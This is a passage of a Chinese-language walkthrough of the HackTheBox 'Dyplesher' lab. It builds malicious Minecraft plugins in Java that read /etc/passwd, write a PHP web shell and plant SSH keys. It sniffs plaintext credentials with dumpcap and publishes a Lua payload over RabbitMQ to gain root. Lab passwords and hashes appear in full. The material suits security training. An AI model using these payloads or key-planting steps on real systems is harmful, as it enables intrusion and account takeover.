[![](https://p1.ssl.qhimg.com/t011111e49a468e9818.png)](https://p1.ssl.qhimg.com/t011111e49a468e9818.png)

左边的toolbar上有一些链接。

Console – `/home/console`：

[![](https://p2.ssl.qhimg.com/t0168bb6a9f10f74d60.png)](https://p2.ssl.qhimg.com/t0168bb6a9f10f74d60.png)

console界面上提示，**Running Paper MC**，Paper MC fork自Spigot，主要是修复Spigot的一些不足之处，Spigot是运行MineCraft服务器的一个软件，他跟官方出的服务器软件不一样的地方在于它可以为服务器装上一些插件，而且稳定性和负载性也比较好，同时也支持多服务器串联，现在的百人服务器也基本都是使用它来架设的。

Reload Plugin – `/home/reload` ：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016e7b4dcc4d552adc.png)

加载/卸载用户自定义的插件。

Add Plugin – `/home/add`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0182399058dc532b1a.png)

上传用户插件，上传的用户需要通过reload来激活。

Delete Plugin – `/home/delete`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0158345304a7783164.png)

删除插件，但其实删不掉，不过我们可以查看当前正在运行的插件情况。

### <a class="reference-link" name="%E5%88%B6%E4%BD%9CMineCraft%E6%8F%92%E4%BB%B6"></a>制作MineCraft插件

先简要介绍下这个插件框架啥的。

既然felamos拥有上传插件和加载插件的权限，所以我们可以自己制作一些插件来运行系统命令，插件制作教程可以参考这篇文章[Creating a plugin with Maven using IntelliJ IDEA](https://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/)。

制作插件需要：
- Intellij IDEA
- JDK，在之前的/root/repositories/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce目录下，有个craftbukkit-1.8.jar，查看MANIFEST.MF文件就知道当前的jdk版本是1.8。
```
╭─root@vultr ~/repositories/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce ‹master*› 
╰─$ ls  
README.md            bukkit.yml           eula.txt  permissions.yml  sc-mqtt.jar        start.command   world
banned-ips.json      commands.yml         help.yml  plugins          server.properties  usercache.json  world_the_end
banned-players.json  craftbukkit-1.8.jar  ops.json  python           spigot-1.8.jar     whitelist.json
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017f22b7b0890582ad.png)

#### <a class="reference-link" name="Step%201"></a>Step 1

`File -&gt; New -&gt; Project`，新建项目，选择`Maven`，jdk版本选择1.8：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01752012bac59bb171.png)

然后填写GroupId和ArtifactId，也就是项目名：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ba7ac98e1671b0f7.png)

#### <a class="reference-link" name="Step%202"></a>Step 2

新建好项目后，首先修改pom.xml文件来添加一些必要的依赖组件。因为要制作一个Spigot插件并且使用相关的API，通过修改pom.xml来引入这些包：

```
&lt;repositories&gt;
        &lt;repository&gt;
            &lt;id&gt;spigot-repo&lt;/id&gt;
            &lt;url&gt;https://hub.spigotmc.org/nexus/content/repositories/snapshots/&lt;/url&gt;
        &lt;/repository&gt;
    &lt;/repositories&gt;

    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.spigotmc&lt;/groupId&gt;
            &lt;artifactId&gt;spigot-api&lt;/artifactId&gt;
            &lt;version&gt;1.16.2-R0.1-SNAPSHOT&lt;/version&gt;
            &lt;scope&gt;provided&lt;/scope&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;
```

右下角弹出提示需要导入这些依赖包，点击`Import Changes`，IDEA会开始进行下载：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c479f6e303d8b8ea.png)

#### <a class="reference-link" name="Step%203"></a>Step 3

然后在左侧的文件夹`mineplug -&gt; src -&gt; main -&gt; java`，右键新建一个包`java -&gt; New -&gt; Package`，包名是你的GroupId + plugin名，我这里就是`htb.dyplesher.mineplug`。然后在该package下新建一个Class，`New -&gt; Class` 。在编写插件时需要先引入必要的包，`import org.bukkit.plugin.java.JavaPlugin`，先利用两个方法`onEnable()`和`onDisable()`进行测试：

```
package htb.dyplesher.mineplug;

import org.bukkit.plugin.java.JavaPlugin;

public class mineplug extends JavaPlugin `{`

    @Override
    public void onEnable() `{`
        getLogger().info("onEnable is called!");
    `}`
    @Override
    public void onDisable() `{`
        getLogger().info("onDisable is called!");
    `}`
`}`
```

#### <a class="reference-link" name="Step%204"></a>Step 4

然后需要将其打包成jar包，首先右键`src -&gt; main -&gt; resources`，新建`plugin.yml`文件，填入plugin的相关信息：

```
name: mineplug
version: 1.0
main: htb.dyplesher.mineplug.mineplug
```

项目的目录结构：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t016474c63c9c522f1d.png)

在IDEA的最右侧隐藏栏上，选择`Maven Projects -&gt; mineplug -&gt; Lifecycle`，右键`package -&gt; Run Maven Build`，生成的jar包在target文件夹下。

### <a class="reference-link" name="%E4%B8%8A%E4%BC%A0%E6%8F%92%E4%BB%B6"></a>上传插件

然后将其通过`/home/add`上传到服务器上：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01cd5854641bd6b759.png)

通过`/home/reload`，输入插件名mineplug来激活：

[![](https://p2.ssl.qhimg.com/t01f7ec97bf83ce51ec.png)](https://p2.ssl.qhimg.com/t01f7ec97bf83ce51ec.png)

在Console处可以看到被激活的插件：

[![](https://p0.ssl.qhimg.com/t01e318fc900ceb5899.png)](https://p0.ssl.qhimg.com/t01e318fc900ceb5899.png)

选择unload可以卸载相应的插件：

[![](https://p0.ssl.qhimg.com/t0169ae151e49355e66.png)](https://p0.ssl.qhimg.com/t0169ae151e49355e66.png)

### <a class="reference-link" name="%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"></a>任意文件读取

既然上传的jar包可以被运行，就意味着可以利用它来执行一些系统命令或是读取一些敏感文件：

```
package htb.dyplesher.mineplug;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

public class mineplug extends JavaPlugin `{`

    @Override
    public void onEnable() `{`
        getLogger().info("onEnable is called!");

        try `{`
            String Line;
            BufferedReader br = new BufferedReader(new FileReader("/etc/passwd"));
            while ((Line = br.readLine()) != null) `{`
                getLogger().info(Line);
            `}`
        `}` catch (IOException e) `{`
            e.printStackTrace();
        `}`
    `}`
    @Override
    public void onDisable() `{`
        getLogger().info("onDisable is called!");
    `}`
`}`
```

在Console里就打印出了服务器上/etc/passwd文件的内容：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01489a694f513196ce.png)



## 上传shell

写入shell：

```
package htb.dyplesher.shellplug;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.FileWriter;

public class shellplug extends JavaPlugin `{`

    @Override
    public void onEnable() `{`
        getLogger().info("onEnable is called!");

        try `{`
            FileWriter fw = new FileWriter("/var/www/test/cmd.php");
            fw.write("&lt;?php echo shell_exec($_GET[0]); ?&gt;");
            fw.close();
        `}` catch (Exception e) `{`
            getLogger().info(e.toString());
        `}`
    `}`
    @Override
    public void onDisable() `{`
        getLogger().info("onDisable is called!");
    `}`
`}`
```

访问 [http://test.dyplesher.htb/cmd.php?0=id](http://test.dyplesher.htb/cmd.php?0=id) :

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01798cac9e29a4618d.png)

当前的用户为MinatoTW，看看`/home/MinatoTW`下有什么，cmd.php?0=ls%20-al%20/home/MinatoTW ：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013e79012f48b5dab2.png)

发现`.ssh`目录，在目录下有`authorized_keys`，那只要上传我们自己的公钥就可以免密登录了：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01b8a0de7ad19ca063.png)

我本机的`.ssh`目录下没有ssh密钥，所以先执行ssh-keygen创建密钥对：

```
ssh-keygen -t rsa -b 4096
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0165a11ed76e69104f.png)

创建后目录下会多出两个文件`id_rsa`和`id_rsa.pub`，前者是私钥，后者是公钥：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013c204f1a375bd808.png)

我们需要将公钥写入到目标主机的`authorized_keys`文件中，就能实现免密登录：

```
package htb.dyplesher.sshplugin;

import java.io.BufferedReader;
import java.io.FileWriter;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

public class sshplugin extends JavaPlugin `{`
    @Override
    public void onEnable() `{`
        getLogger().info("onEnable is called!");

        try `{`
            FileWriter fw = new FileWriter("/home/MinatoTW/.ssh/authorized_keys");
            fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCu/ObL6IdSkC6UU2xkZR3frEofJxER7tnjG59fa2Zk98m1Ib/[......]/e01IYwqeAFXhW4wvezG/Icbf2iuTOHggEdnHsBDBL/upYw== kali@kali");
            fw.close();
            getLogger().info("Successfully wrote to the file");
        `}` catch (Exception e) `{`
            getLogger().info(e.toString());
        `}`
    `}`
    @Override
    public void onDisable() `{`
        getLogger().info("onDisable is called!");
    `}`
`}`
```

上传插件并加载后，登录成功：

[![](https://p3.ssl.qhimg.com/t0125b51404cf966795.png)](https://p3.ssl.qhimg.com/t0125b51404cf966795.png)

登录后，在`/home/MinatoT`目录下有三个文件夹：

```
MinatoTW@dyplesher:~$ ls
backup  Cuberite  paper
MinatoTW@dyplesher:~$ ls -alt
total 64
drwx------  2 MinatoTW MinatoTW 4096 May 20 13:45 .ssh
drwxr-xr-x 10 MinatoTW MinatoTW 4096 May 20 13:41 .
drwx------  2 MinatoTW MinatoTW 4096 Apr 23  2020 .cache
drwx------  3 MinatoTW MinatoTW 4096 Apr 23  2020 .gnupg
-rw-------  1 MinatoTW MinatoTW  802 Apr 23  2020 .viminfo
drwxrwxr-x 11 MinatoTW MinatoTW 4096 Apr 23  2020 Cuberite
lrwxrwxrwx  1 root     root        9 Apr 23  2020 .bash_history -&gt; /dev/null
drwxr-xr-x  6 root     root     4096 Apr 23  2020 ..
drwxr-xr-x  2 root     root     4096 Apr 23  2020 backup
drwxrwxr-x  3 MinatoTW MinatoTW 4096 Apr 23  2020 .composer
drwxrwxr-x  6 MinatoTW MinatoTW 4096 Apr 23  2020 paper
-rw-rw-r--  1 MinatoTW MinatoTW   54 Apr 23  2020 .gitconfig
drwxrwxr-x  3 MinatoTW MinatoTW 4096 Apr 23  2020 .local
-rw-rw-r--  1 MinatoTW MinatoTW   66 Apr 23  2020 .selected_editor
-rw-r--r--  1 MinatoTW MinatoTW  220 Apr 23  2020 .bash_logout
-rw-r--r--  1 MinatoTW MinatoTW 3771 Apr 23  2020 .bashrc
-rw-r--r--  1 MinatoTW MinatoTW  807 Apr 23  2020 .profile
```

backup文件夹下主要就是保存了三个用户的账号密码信息等：

```
MinatoTW@dyplesher:~$ cd backup/
MinatoTW@dyplesher:~/backup$ ls -alt
total 24
drwxr-xr-x 10 MinatoTW MinatoTW 4096 May 20 13:41 ..
drwxr-xr-x  2 root     root     4096 Apr 23  2020 .
-rwxr-xr-x  1 root     root       66 Apr 23  2020 email
-rwxr-xr-x  1 root     root       24 Apr 23  2020 username
-rwxr-xr-x  1 root     root      170 Apr 23  2020 backup.sh
-rwxr-xr-x  1 root     root      182 Sep 15  2019 password
MinatoTW@dyplesher:~/backup$ cat email 
MinatoTW@dyplesher.htb
felamos@dyplesher.htb
yuntao@dyplesher.htb
MinatoTW@dyplesher:~/backup$ cat username 
MinatoTW
felamos
yuntao
MinatoTW@dyplesher:~/backup$ cat password 
$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS
MinatoTW@dyplesher:~/backup$ cat backup.sh 
#!/bin/bash

memcflush --servers 127.0.0.1 --username felamos --password zxcvbnm
memccp --servers 127.0.0.1 --username felamos --password zxcvbnm /home/MinatoTW/backup/*
```

`paper/`文件夹下的内容就是之前在repo.zip包中的部分文件：

```
MinatoTW@dyplesher:~/paper$ ls -al
total 39392
drwxrwxr-x  6 MinatoTW MinatoTW     4096 Apr 23  2020 .
drwxr-xr-x 10 MinatoTW MinatoTW     4096 May 20 13:41 ..
-rw-rw-r--  1 MinatoTW MinatoTW        2 Nov  7 14:25 banned-ips.json
-rw-rw-r--  1 MinatoTW MinatoTW        2 Nov  7 14:25 banned-players.json
-rw-rw-r--  1 MinatoTW MinatoTW     1049 Nov  7 14:25 bukkit.yml
drwxrwxr-x  2 MinatoTW MinatoTW     4096 Sep  8  2019 cache
-rw-rw-r--  1 MinatoTW MinatoTW      593 Nov  7 14:25 commands.yml
-rw-rw-r--  1 MinatoTW MinatoTW      221 Sep  8  2019 eula.txt
-rw-rw-r--  1 MinatoTW MinatoTW     2576 Sep  8  2019 help.yml
drwxrwxr-x  2 MinatoTW MinatoTW     4096 Nov  7 14:25 logs
-rw-rw-r--  1 MinatoTW MinatoTW        2 Nov  7 14:25 ops.json
-rw-rw-r--  1 MinatoTW MinatoTW 40248740 Sep  8  2019 paper.jar
-rw-rw-r--  1 MinatoTW MinatoTW     5417 Nov  7 14:25 paper.yml
-rw-rw-r--  1 MinatoTW MinatoTW        0 Sep  8  2019 permissions.yml
drwxrwxr-x  4 MinatoTW MinatoTW     4096 Nov  7 16:20 plugins
-rw-rw-r--  1 MinatoTW MinatoTW      723 Nov  7 14:25 server.properties
-rw-rw-r--  1 MinatoTW MinatoTW     3311 Nov  7 14:25 spigot.yml
-rwxrwxr-x  1 MinatoTW MinatoTW       48 Sep  8  2019 start.sh
-rw-rw-r--  1 MinatoTW MinatoTW        2 Nov  7 14:25 usercache.json
-rw-rw-r--  1 MinatoTW MinatoTW       48 Sep  8  2019 version_history.json
-rw-rw-r--  1 MinatoTW MinatoTW        2 Sep  8  2019 whitelist.json
drwxrwxr-x  5 MinatoTW MinatoTW     4096 Nov  7 17:11 world
```

Cuberite是Minecraft的一个服务器实现，而`Cuberite/`目录下就是相关文件：

```
MinatoTW@dyplesher:~/Cuberite$ ls
BACKERS         buildinfo     Cuberite     helgrind.log  itemblacklist  LICENSE   MojangAPI.sqlite          motd.txt  Ranks.sqlite  start.sh  webadmin          world
banlist.sqlite  CONTRIBUTORS  favicon.png  hg            items.ini      Licenses  MojangAPI.sqlite-journal  Plugins   README.txt    vg        webadmin.ini      world_nether
brewing.txt     crafting.txt  furnace.txt  hg.supp       lang           logs      monsters.ini              Prefabs   settings.ini  vg.supp   whitelist.sqlite  world_the_end
```

到目前为止并没有在这三个文件夹下发现什么可用的信息……

但是当前的用户的属组之一是`wireshark`：

```
MinatoTW@dyplesher:~$ id
uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
```

寻找属组为wireshark的文件，发现只有一个文件`/usr/bin/dumpcap`，是一个抓包软件：

```
MinatoTW@dyplesher:/$ find / -group wireshark -ls 2&gt;/dev/null 
  5908757    112 -rwxr-xr--   1 root     wireshark   113112 Sep 26  2019 /usr/bin/dumpcap
```

该文件也没有什么suid标志，所以也很难通过它来提权。

### <a class="reference-link" name="dumpcap"></a>dumpcap

但是我们可以执行dumpcap命令，抓个包试试，保存为`/tmp/out.pcapng`：

```
MinatoTW@dyplesher:~$ dumpcap -w /tmp/out.pcapng
Capturing on 'veth5f13bbe'
File: /tmp/out.pcapng
Packets: 1800
```

用wireshark打开`out.pcagpng`：

[![](https://p2.ssl.qhimg.com/t016606918f89e19cc6.png)](https://p2.ssl.qhimg.com/t016606918f89e19cc6.png)

发现了很多条与AMQP协议相关的流量，右键`Follow TCP Stream`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013fbaae5585cce20c.png)

发现了用户`MinatoTW`、`felamos`和`Yuntao`的账号密码：

```
name : MinatoTW
email : MinatoTW@dyplesher.htb
password : bihys1amFov

name : yuntao
email : yuntao@dyplesher.htb
password : wagthAw4ob

name : felamos
email : felamos@dyplesher.htb
password : tieb0graQueg
```

登录用户felamos（在yuntao的/home目录下没有发现什么有意思的东西）：

```
╭─kali@kali ~ 
╰─$ ssh felamos@10.10.10.190
felamos@10.10.10.190's password: 
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 07 Nov 2020 05:37:23 PM UTC

  System load:  0.05              Processes:              259
  Usage of /:   6.7% of 97.93GB   Users logged in:        1
  Memory usage: 41%               IP address for ens33:   10.10.10.190
  Swap usage:   0%                IP address for docker0: 172.17.0.1


57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Thu Apr 23 17:33:41 2020 from 192.168.0.103
felamos@dyplesher:~$ id
uid=1000(felamos) gid=1000(felamos) groups=1000(felamos)
```

在home目录下发现user.txt，拿到user flag：

```
felamos@dyplesher:~$ ls
cache  snap  user.txt  yuntao
felamos@dyplesher:~$ cat user.txt 
xxxxxxxxxxxxxxxxxxxx
```

### <a class="reference-link" name="%E6%8F%90%E6%9D%83"></a>提权

在`/home/felamos`下存在名为`yuntao`的目录，目录下只有一个脚本`send.sh`：

```
felamos@dyplesher:~$ cd yuntao/
felamos@dyplesher:~/yuntao$ ls
send.sh
felamos@dyplesher:~/yuntao$ cat send.sh
#!/bin/bash

echo 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' &gt;  /dev/pts/`{``}`
```

这个脚本没有什么特别的意思，只是会向`/dev/pts/`目录下的``{``}``管道输出一条消息：

> Yuntao， 请发布所有用户的cuberite插件，只需要提供url去下载plugin即可，我们的代码会自动访问该插件并且将插件放在服务器上执行。

#### <a class="reference-link" name="AMQP%E5%8D%8F%E8%AE%AE"></a>AMQP协议

AMQP协议全称Advanced Message Queuing Protocol（高级消息队列协议），是面向消息中间件提供的开放的应用层协议，其设计目标是对消息的排序、路由、保证可靠性和安全性（[wikipedia](https://zh.wikipedia.org/zh-hans/%E9%AB%98%E7%BA%A7%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%8D%8F%E8%AE%AE)）。我们可以把消息队列比作是一个存放消息的容器，当我们需要使用消息的时候可以取出消息供自己使用，目的是通过异步处理提高系统性能、降低系统耦合性，目前使用比较多的消息队列有ActiveMQ，RabbitMQ（[zhihu](https://zhuanlan.zhihu.com/p/52773169)），后者就是目标服务器上使用的消息队列。

#### <a class="reference-link" name="RabbitMQ"></a>RabbitMQ

RabbitMQ是一个实现了AMQP协议的消息队列。RabbitMQ的工作原理如下图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0178ddca9780623835.png)
- Producer：发送消息到MQ。
- Broker：消息队列服务进程，包括exchange和queue。
- Exchange：消息队列交换机，会按照一定的规则对消息进行过滤，并将消息转发到某个队列。
- Queue：消息队列，在消息到达队列的时候会被转发给指定的Consumer。
- Consumer：接收MQ转发的消息。
当存在多个Queue的时候，消息会被Exchange按照一定的路由规则分发到指定的Queue中去。这就涉及到Producer指定的消息的routing key，routing key指定了Message会被发送到哪个Exchange，Queue会通过binding key绑定到指定的Exchange。Exchange通过对比Message的routing key和Queue的binding key来决定消息会被发送到哪个队列。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t017a69990a723f1d38.png)

前面提到的`send.sh`就是指Yuntao可以发布用户自己定制的cuberite插件，如下图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014d925186f2a68c7c.png)

Cubrite是一个可扩展的Minecraft服务器实现，它有一个易于使用的插件系统，允许用户用Lua编写自定义插件。

从之前抓到的流量包里我们也知道了Yuntao的AMQP凭证是`EashAnicOc3Op`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d13c6d6ff51568dd.png)

我们可以借用一款工具来发布我们的Lua插件，[amqp-publish](https://github.com/selency/amqp-publish)：

```
╭─kali@kali ~/htb-tools 
╰─$ ./amqp-publish.linux-amd64 --help        
Usage of ./amqp-publish.linux-amd64:
  -body string
        Message body
  -exchange string
        Exchange name
  -routing-key string
        Routing key. Use queue
        name with blank exchange to publish directly to queue.
  -uri string
        AMQP URI amqp://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/[vhost]
```

在此之前，先看看是否可以通过这种方式在目标服务器上执行命令。先尝试创建一个lua脚本，它会向/tmp目录写入名为test的文件：

```
// test.lua

os.execute("touch /tmp/test")
```

先在目标主机上开启fpt服务，主要目的是判断我们有没有成功发布消息：

```
MinatoTW@dyplesher:~/paper$ python3 -m http.server 22222
Serving HTTP on 0.0.0.0 port 22222 (http://0.0.0.0:22222/) ...
```

除了已经知道的`&lt;user&gt;:&lt;password&gt;`以外，我们还需要提供`exchange`和`routing-key`，从`send.sh`中可以推测出它们应该是`plugin_data`：

```
Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue".
```

通过amqp-publish发布：

```
╭─kali@kali ~/htb-tools 
╰─$ ./amqp-publish.linux-amd64 --uri="amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/" --exchange="" --routing-key="plugin_data" --body="http://127.0.0.1:22222/test.lua"

```

消息被成功发布：

```
MinatoTW@dyplesher:~/paper$ python3 -m http.server 22222
Serving HTTP on 0.0.0.0 port 22222 (http://0.0.0.0:22222/) ...
127.0.0.1 - - [07/Nov/2020 18:38:50] "GET /test.lua HTTP/1.0" 200 -
```

`test.lua`被成功执行，在`/tmp`目录下，`test`文件被创建：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017ba3d1fe54512dab.png)

并且该文件是属于root用户的。

#### <a class="reference-link" name="ssh.lua%20-&gt;%20RCE"></a>ssh.lua -&gt; RCE

现在我们可以向`/root/.ssh/authorized_keys`写入我们的公钥：

```
// ssh.lua

file = io.open('/root/.ssh/authorized_keys', 'w+')
ssh = 'ssh-rsa AAAAB......BL/upYw== kali@kali'
file.write(ssh)
file.close()
```

通过同样的方式发布：

```
╭─kali@kali ~/htb-tools 
╰─$ ./amqp-publish.linux-amd64 --uri="amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/" --exchange="" --routing-key="plugin_data" --body="http://127.0.0.1:22222/ssh.lua"

```

成功登录root用户：

```
╭─kali@kali ~/.ssh 
╰─$ ls
id_rsa  id_rsa.pub  known_hosts
╭─kali@kali ~/.ssh 
╰─$ ssh -i id_rsa root@10.10.10.190
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 07 Nov 2020 06:44:33 PM UTC

  System load:  0.06              Processes:              261
  Usage of /:   6.7% of 97.93GB   Users logged in:        1
  Memory usage: 42%               IP address for ens33:   10.10.10.190
  Swap usage:   0%                IP address for docker0: 172.17.0.1


57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Sun May 24 03:33:34 2020
root@dyplesher:~# id
uid=0(root) gid=0(root) groups=0(root)
root@dyplesher:~#
```

读取root.txt：

```
root@dyplesher:~# ls
root.txt  snap  work
```
